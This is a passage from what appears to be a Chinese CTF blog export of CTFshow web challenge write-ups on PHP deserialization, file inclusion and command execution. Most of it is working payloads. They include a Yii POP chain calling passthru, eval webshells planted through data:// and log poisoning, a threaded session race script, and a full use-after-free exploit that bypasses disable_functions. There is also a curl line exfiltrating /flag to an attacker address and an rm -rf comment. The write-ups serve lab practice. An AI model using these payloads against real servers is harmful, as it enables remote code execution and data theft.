yii\\rest\\IndexAction::run()`\n\n```php\npoc\n<?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this->checkAccess = 'passthru';\n            $this->id = 'tac /flag';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            $this->formatters['close'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace yii\\db{\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n\n        public function __construct(){\n            $this->_dataReader = new Generator;\n        }\n    }\n}\nnamespace{\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\n}\n?>\n\n```\n\n","tags":["CTF","web"]},{"title":"CTFshow文件包含","url":"/posts/5550.html","content":"\n# 文件包含\n\n常见的文件包含漏洞函数：include()，require()\n\n### 本地包含\n\n#### 利用方式：\n\n###### 1、php://input：\n\n```\n?file=php://input\n请求体内为PHP代码：<?php phpinfo(); ?>\n```\n\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n\n遇到file_get_contents()要想到用php://input绕过。\n\n<!--more-->\n\n###### 2、php://filter：\n\n```\n?file=php://filter/rescource=xxx.php\n以base64编码读取\n?file=php://filter/read=convert.base64-encode/resource=xxx.php\n```\n\nphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。\n\n###### 3、zip://：\n\n```\n?file=zip://[压缩包绝对路径]#[压缩包内文件]\n```\n\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n\n- zip://中只能传入绝对路径。\n- 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23\n- 只需要是zip的压缩包即可，后缀名可以任意更改。\n- 相同的类型的还有zlib://和bzip2://\n\n###### 4、data://：\n\n```\n?file=data://[<MIME-type>][;cherset=<encoding>][;base64],<data>\n下面为示例\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=\n```\n\ndata:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。\n\n###### 5、phar//：\n\n```\n?file=phar://压缩包路径（相对绝对都可）/压缩包内文件\n```\n\n需要phar://有点类似zip://同样可以导致任意代码执行。~~未来的我补一句，这玩意还是乖乖用来反序列化比较好~~\n\n#### 可供包含的内容：\n\n###### 1、包含Apache日志文件：\n\n###### **条件：对日志文件可读并且知道日志文件的存储目录**\n\n**注意事项：**一般情况下日志存储目录被修改，需要读取服务器配置文件（httpd，conf，nginx，conf...）或者根据phpinfo()中的信息来得知。还有就是日志记录的信息都可以被调整，比如记录报错的等级或者内容格式。\n\nApache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。\n\n如果访问一个不存在的资源时，如http://www.xxxx.com/<?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。\n\n可以放在User-Agent中\n\n###### 2、包含SESSION\n\n**条件：**找到Session内的可控变量，并且Session文件可读写，并且知道存储路径，PHP中SESSION文件保存路径可以在phpinfo中看到\n\n**常见路径：**\n\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsession文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。\n\n\n###### 3、包含/pros/self/environ\n\n**内容：**proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。\n\n**条件：**php以cgi方式运行，这样environ才会保持UA头。environ文件存储位置已知，且environ文件可读。\n\n###### 4、包含临时文件\n\nphp中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\Winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。\n\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。\n\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。\n\n##### 78\n\n```\npayload:?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n无过滤直接伪协议读取flag\n\n##### 79\n\n```\npayload:?file=data://text/plain,<?=eval($_POST['cmd']);?>\nPOST\ncmd=system('cat flag.php');\n\npayload:?file=data://text/plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\n```\n\n过滤了php，可使用data协议，通过再传入一个参数来执行命令，也可base64解码出想执行的命令\n\n##### 80\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了data，可通过包含日志来执行命令\n\n##### 81\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了冒号，日志包含依然可行\n\n##### 82\n\n过滤了.，只能包含无后缀文件，在PHP中唯一能控制的无后缀文件就是session文件，所以尝试通过脚本竞争包含写入\n\n```\n原理：在我们自行添加PHPSSEID到网页中时，服务器会自动生成一个文件在/tmp/sess_name，文件名可控。文件内容通过PHP_ SESSION_UPLOAD_PROGRESS参数控制，该参数用于实时获取文件上传进度，会返回一个SESSION，并且该参数的内容将会被加入到sess_name文件中\n方法：一边构造POST文件传输请求，将PHP_SESSION_UPLOAD_PROGRESS包含到请求头中，一边包含/tmp/sess_name文件\n```\n\n##### 83-86\n\n```Python\n# 竞争万能脚本：\n# os.system('rm -rf /bin/Azuki')\n# 消灭Azuki保平安\nimport io\nimport requests\nimport threading\n\nsessID = 'flag'\nurl = 'http://193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show/'\n\n\ndef write(session):\n    while event.isSet():\n        f = io.BytesIO(b'a' * 1024 * 50)\n        response = session.post(\n            url,\n            cookies={'PHPSESSID': sessID},\n            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"cat *.php\");?>'},\n            files={'file': ('test.txt', f)}\n        )\n\n\ndef read(session):\n    while event.isSet():\n        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))\n        if 'test' in response.text:\n            print(response.text)\n            event.clear()\n        else:\n            print('[*]retrying...')\n\n\nif __name__ == '__main__':\n    event = threading.Event()\n    event.set()\n    with requests.session() as session:\n        for i in range(1, 30):\n            threading.Thread(target=write, args=(session,)).start()\n\n        for i in range(1, 30):\n            threading.Thread(target=read, args=(session,)).start()\n```\n\n**87**\n\n先贴一个[文章](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)\n\n对于php://filter的使用\n\n简单版本：使用rot13编解码绕过\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>经过rot13编码\n```\n\n复杂版本：使用base64编解码绕过\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>经过rot13编码\n```\n\n原理：在过滤器进行base64编解码时，会绕过所有不属于base64编码后的字符（+, / , 0~9,a~z,A~Z），比如题中的`<?php die(\"大佬别秀了\");?>`，过滤器识别到的字符只有phpdie，其余的字符被忽略，我们只需要在我们已经编好的base64文本加两个字母即可让phpdiexx被解析为base64编码后语句，与后面代码无关了\n\n**88**\n\n构造语句使得base64编码后只含数字和字母即可\n\n```\npayload:?file=data://text/plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7\n//<?php   eval($_POST[1]);\nPOST:\n1=system('tac f*');\n```\n","tags":["CTF","web"]},{"title":"CTFshow命令执行","url":"/posts/47520.html","content":"\n# 命令执行\n\n危险函数：\n\n```\n------------------------------------------------执行(系统)函数\n\t eval\n\t exec - 执行一个外部程序\n\t shell_exec\n\t system\n\t passthru\n\t proc_open\n\t pcntl_exec — 在当前进程空间执行指定程序\n\t pcntl_fork  在当前进程当前位置产生分支（子进程）。\n\t dl — 运行时载入一个 PHP 扩展\n\t unserialize - 反序列化一个类函数nashell\n\t ------------------------------------------------显示源码   \n\t phpinfo\n\t readfile\n\t readline\n\t show_source\n\t heighlight\n\t heighlight_string\n\t curl\n\t php\n   curl -f filename=@/flag [要传到的ip地址和端口]\t\n\t 解释：在linux里面单引号里面的的命令会直接先执行\n\t 以上的curl -f命令会把@后面文件名对应的文件传输到指定的ip端口地址\n\t 所以会直接执行curl命令将得到的flag文件传输到指定id端口，不需要管ping\t  命令了只要监听此端口拿到文件即可\n\t file \n\t ------------------------------------------------回调函数\n\t array_walk\n\t array_walk_recursive\n\t array_map\n\t call_user_func_array\n\t call_user_func\n\t ------------------------------------------------数组使用回调函数过滤\n\t array_filter\n\t filter_var\n\t filter_var_array\n\t ------------------------------------------------写入文件\n\t fopen\n\t fwrite\n\t file_put_contents - 将数据写入文件中\n\t file-get-contents - 获取参数的文件资源\n\t move_uploaded_file - 将上传的文件移动到新位置\n\t ------------------------------------------------命令字符串转义\n\t escapeshellcmd - 对特殊字符转义\n\t escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数\n\t ------------------------------------------------其他\n\t proc_terminate — 杀除由 proc_open 打开的进程\n\t touch - 设定文件的访问和修改时间\n```\n\n可用于执行php函数的函数：\n\n```\neval()、assert()、preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\")\n//正则规则中含有/e修饰符就存在代码执行漏洞\ncreate_function()\n```\n\n可用于执行系统命令的函数：\n\n```php\nexec()//返回命令执行结果，加echo\npassthru()//执行后直接显示结果\nsystem()//执行后直接显示结果,返回值：成功则返回命令输出的最后一行， 失败则返回 false\nshell_exec()//返回命令执行结果，加echo\n`命令`//返回命令执行结果，加echo\npopen()\nproc_open()\npcntl_exec()\n```\n\n<!--more-->\n\n可用于替代空格的字符：\n\n```\n%09、$IFS$9、 ${IFS}、$IFS%09、< 、<>、%20等\n```\n\n可用于读取文件的命令：\n\n```\ncat\ntac\nhead\nmore\nless\ncut\nnl\nls / | tee 1.txt\n将ls后的结果写入1.txt中\n```\n\n通配符：\n\n```\n*代表任意位\n?代表一位\n```\n\n**取反绕过**\n\n原理：php字符串取反之后可绕过正则\n\n```php\n<?php\n\t$s='phpinfo';\n\techo urlencode(~$s);\n\t//%8F%97%8F%96%91%99%90\n?>\n```\n\n这时传入`a=(~%8F%97%8F%96%91%99%90)();`\n\n即可执行phpinfo函数\n\n对于PHP，形如 `(func_name)()`，其中func_name可以是字符串，会执行这个func\n\n但是如果只传入`(~%8F%97%8F%96%91%99%90%D7%D6)`内容为`phpinfo()`，会发现此时函数不会被执行，此时php取反取得了phpinfo，但是取反得到的字符串 `phpinfo()`并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 `phpinfo()`\n\n所以如果我们想执行shell，是不能单传入一个`$_POST['kkk']`的取反来执行的，而是需要使用嵌套执行的方式，形如`assert($_POST[kkk])`传入`(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%94%94%94%A2)`再传入命令kkk来执行\n\n\n\n\n\n\n\n\n\n\n\n##### 29\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag，使用通配符绕过，f*代表匹配所有以f开头的文件，\\`内部为执行的命令，通过echo得到返回值\\`\n\n##### 30\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag,system,php，同上\n\n##### 31\n\n```\npayload:?c=echo(`tac%09f*`);\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格，使用%09将空格替代即可\n\n##### 32\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号，可以使用文件包含函数`include()`，include可以实现无括号包含，进而通过`?>`将整个PHP代码闭合即可绕过分号，而后就能做到参数逃逸（因为代码中只检测了c中传入的内容），进而通过传入参数通过php伪协议读取内容\n\n##### 33\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号，同上\n\n##### 34\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号，同上\n\n##### 35\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号，同上\n\n##### 36\n\n```\npayload:?c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号,数字，将get参数中的数字改为字母即可\n\n##### 37\n\n```\npayload:?c=php://input\n请求体:<?php include \"flag.php\"?>\n或\npayload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\ninclude函数开始，过滤了flag，通过php://input伪协议直接包含文件\n\n##### 38\n\n```\npayload:?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4=\n```\n\n过滤了flag, php,file，通过data伪协议执行include \"flag.php\"\n\n##### 39\n\n```\npayload:?c=data://text/plain,<?php system(\"cat fla*.php\");?>\n```\n\n过滤了flag并且包含的是变量c.php，输入后相当于直接执行输入的PHP命令，由于前面的PHP内容已经闭合，所以后面的.php直接就是.php文本显示，对前面的命令输入没有影响\n\n##### 40\n\n```\npayload:?c=eval(array_pop(next(get_defined_vars())));\n\nPOST:a=system('cat flag.php');\n```\n\nprint_r(get_defined_vars());可以拿到所有已经定义的变量并取得值\n\nnext(变量)可以获得下一个变量\n\narray_pop(数组)弹出数组中的变量为单个独立变量\n\n```\nc=session_start();system(session_id());\npassid=ls\n```\n\n本地修改sessionID传入命令\n\n##### 41\n\n```\n\n```\n\n```\n'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\n```\n\n可以发现大多数自负都被过滤，查看提示\n\n通过脚本可获取异或（｜）后能得到的所有字符\n\n直接使用脚本\n\n##### 42\n\n```\npayload:?c=cat flag.php;\n```\n\n$c.\" >/dev/null 2>&1\"\n\n题目中将命令输出保存到黑洞中，可通过分号分割命令让第一个执行的命令直接显示\n\n##### 43\n\n```\npayload:?c=tac%20flag.php%26%26\n```\n\n同上题，过滤了cat和分号，通过&&也可进行多命令执行，要进行URL编码\n\n##### 44\n\n```\npayload:?c=tac%20fla*.php%26%26\n```\n\n同上题，过滤了flag，使用通配符\n\n##### 45\n\n```\npayload:?c=tac${IFS}fla*.php%26%26\n```\n\n同上题，过滤了空格，找个能替代的就行\n\n##### 46\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了*和$，使用%09（制表符）替代空格\n\n##### 47\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了一些读取文件的命令，但没滤tac，直接用\n\n##### 48\n\n```\npayload:?c=tac<fl%27%27ag.php%26%26\n```\n\n同上题，过滤了数字和空格\n\n##### 49\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n同上题，过滤了水平制表符和&&符，将&更换为｜也可以多命令执行\n\n##### 50\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n##### 51\n\n```\npayload:?c=nl<fla%27%27g.php||\n```\n\n滤了tac呜呜呜呜用nl\n\n##### 52\n\n```\npayload:?c=nl${IFS}/fl%27%27ag||\n```\n\n滤掉了尖括号但是$回来了\n\n`nl${IFS}fla%27%27g.php||`\n\n但是明显flag不对，所以看一下根目录`ls${IFS}/`发现flag存在\n\n使用nl读取\n\n##### 53\n\n```\npayload:?c=ta%27%27c${IFS}fla?.php\n```\n\n该题内容不同\n\n```\necho($c);\n$d = system($c);\necho \"<br>\".$d;\n```\n\n先将命令打印并执行后获得system函数的返回值并输出，system函数只返回命令执行后输出的最后一行，使用tac\n\n##### 54\n\n```\npayload:c=mv${IFS}fla?.php${IFS}kkk.txt\n/kkk.txt\n```\n\n过滤了单引号绕过，通过mv命令重命名直接读取\n\n##### 55\n\n过滤`\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\"\n\n**无字母数字的命令执行**\n\n直接讲原理咯\n\n.（点）或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则“.file”的意思就是用bash执行file文件中的命令。用“.file”执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用“.”来执行它了吗？\n\n咋执行呢，原理是当我们发送一个上传文件的POST包时，这个文件会被储存在临时目录中，默认的文件是`/tmp/phpXXXXXX`(六个随机字符)，那么我们就可以用通配符（?单匹配和*多匹配）来尝试执行我们上传的文件，但是尝试执行后发现不行，我们自己搭建一个php环境看一下为什么\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png)\n\n列出相关的文件后发现是因为符合匹配条件的文件数量不止一个，就导致还没运行到我们上传的脚本时就已经结束了，所以我们要尝试用其他的通配符匹配出我们需要的文件，查看相关资料，Linux的glob通配符的相关内容（贴个链接）\n\nhttps://man7.org/linux/man-pages/man7/glob.7.html\n\n除了使用?和*进行任意匹配，还可以使用`[^X]`来排除某个字符，这样我们就可以排除前面包含`-`和`.`文件，继续查看发现还剩下三个文件，而后发现还有一个通配符语法`[X-Y]`可以表示一个范围，而且只有php临时文件中包含大写字母，查询ascii码表发现大写字母位于`@`和`[`之间，所以构造`[@-[]`就可以匹配到我们的文件了\n\n最终payload\n\n首先构建一个上传文件的html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n</head>\n<body>\n<form action=\"当前链接/?c=./???/????????[@-[]\" method=\"post\" enctype=\"multipart/form-data\">\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n第一个文件内容\n\n```shell\nls\n然后\ncat /var/www/html/flag.php\n```\n\n如果一次不成功就repeater多试几次\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png)\n\n拿到flag\n\n##### 57\n\n```\npayload:?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\n\n过滤了大量字符，最终需要构建36即可，没有过滤`$`，而在Linux中$是变量的关键字，所以我们可以使用变量\n\n```\n$(())这个变量中的()代表数学运算，结果为0，所以\necho $(())\n0\n对这个变量进行取反操作结果为\necho ~$(())\n~0\n那么我们再对~0进行数学运算得到的结果就是\necho $((~$(())))\n~1\n所以我们想得到36就是让36个~1相加再取反\necho $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n##### 58\n\n```\npayload:\nPOST\nc=file_get_contents('flag.php')\n```\n\n命令执行，突破禁用函数\n\n首先尝试system发现被过滤了，emmmm尝试过后发现能执行系统命令的全被禁用了\n\n那么尝试能否读取文件，使用file_get_contents读取成功，提示中也显示show_source同样可用\n\n##### 59\n\n```\npayload:\nPOST\nc=show_source('flag.php')\n```\n\n能执行系统命令的就别试了，全挂了\n\nshow_source可用\n\n还可尝试通过include来包含文件，再通过PHP伪协议进行读取\n\n```\npayload:?file=php://filter/read=convert.base64-encode/resource=flag.php\nPOST\nc=include($_GET['flie']);\n```\n\n##### 60\n\n```\npayload:\nPOST\nc=highlight_file('flag.php');\n```\n\n上一题可用的方法也可\n\n##### 61\n\n同上\n\n##### 62\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n上面所有方法皆可\n\n##### 63\n\n```\npayload:\nPOST\nc=include('flag.php');var_dump(get_defined_vars());\n```\n\n`get_defined_vars()`可获得所有已定义的变量，当不知道变量名时可使用这个\n\n上面方法同样🉑️\n\n##### 64\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n`scandir('.')`可用于扫描文件，和ls一个意思，当我们不知道文件名时可使用\n\n##### 65\n\n同上\n\n##### 66\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 17.49.25.png)\n\n尝试失败还被嘲讽了，首先扫描一下文件，发现根目录下有flag.txt，`highlight_file('/flag.txt')`读取即可\n\n```\npayload:\nPOST\nc=highlight_file('/flag.txt');\n```\n\n##### 67\n\n同上\n\n##### 68\n\n```\npayload:\nPOST\nc=include('/flag.txt')\n```\n\n属于是离谱了，直接封了`highlight_file`函数，`var_dump(scandir('/'))`，发现在根目录中，直接include文件，没有php标签即为直接显示源码，等于直接显示flag.txt的内容\n\n##### 69\n\n同上\n\n##### 70\n\n继续白嫖\n\n##### 71\n\n```\npayload:\nPOST\nc=include('/flag.txt');exit();\n```\n\n尝试白嫖发现失败，下载源码进行查看，发现在输出之前将缓冲区中的所有数字字母换成了问号，那么我们让它包含完直接退出就行了\n\n##### 72\n\n文件换位置了哭哭，scandir找不到根目录，var_dump也没了，哭哭\n\n看提示\n\n首先找出文件名\n\n```PHP\npayload:\nPOST\nc=$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} exit(0);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 23.52.16.png)uaf脚本如下\n\n```PHP\n<?php\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace();\n            if(!isset($backtrace[1]['args'])) {\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr & 0xff));\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { \n\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { \n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) {\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) {\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; \n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); \n    write($abc, 0xd0 + 0x68, $zif_system); \n\n    ($helper->b)($cmd);\n    exit();\n}\n\nctfshow(\"cat /flag0.txt\");ob_end_flush();\n?>\n\n```\n\n最终\n\n```\npayload:\nPOST\nc=上面的代码\n```\n\n##### 73\n\ninclude回来里，flagc.txt\n\n##### 74\n\n```\npayload:\nPOST\nc=include('/flagx.txt');exit();\n```\n\n首先扫目录，同上题payload，而后发现在根目录有flagx.txt尝试包含成功\n\n##### 75\n\nban掉了open_basedir访问文件的方式，只能通过别的方法来访问文件，可以通过mysql访问，在前面几题中可以找到mysql的账号密码，最终payload如下\n\n```PHP\npayload:\nPOST\nc=try {\n  $dbh = new 